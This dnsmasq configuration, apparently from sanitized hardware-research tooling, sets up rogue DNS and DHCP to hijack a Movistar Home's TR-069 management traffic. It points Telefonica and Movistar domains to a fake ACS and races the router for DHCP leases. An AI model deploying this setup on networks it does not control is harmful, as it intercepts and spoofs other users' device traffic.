# SANITIZED for publication. Part of the off-kernel TR-069/Troya tooling.
# Host addresses, key filenames and credentials were replaced with placeholders.
# Use only on a device you own / are authorised to test.
# Rogue DNS + DHCP for Movistar Home TR-069 hijack (run as root)
# DNS: hijacks telefonica/movistar domains to this Mac, forwards everything else
# DHCP: races the router to hand out leases with DNS = this Mac

# ---- DNS ----
port=53
interface=en0
bind-interfaces
log-queries

# normal resolution goes through the router
server=<gateway>

# hijacked domains -> our Mac (fake ACS)
address=/telefonica.net/<tester-host>
address=/telefonica.com/<tester-host>
address=/telefonica.es/<tester-host>
address=/telefonica.de/<tester-host>
address=/movistar.com/<tester-host>
address=/movistar.es/<tester-host>
address=/movistar.net/<tester-host>
address=/rima-tde.net/<tester-host>
address=/telecable.es/<tester-host>

# ---- DHCP (rogue) ----
dhcp-authoritative
# small range + short lease so other LAN devices barely notice
dhcp-range=<gateway>40,<gateway>41,5m
# the Movistar Home keeps its usual IP
dhcp-host=<device-mac>,<device>
# hand out OURSELVES as DNS server
dhcp-option=option:dns-server,<tester-host>
# default gateway stays the real router (only DNS is hijacked)
dhcp-option=option:router,<gateway>

log-dhcp
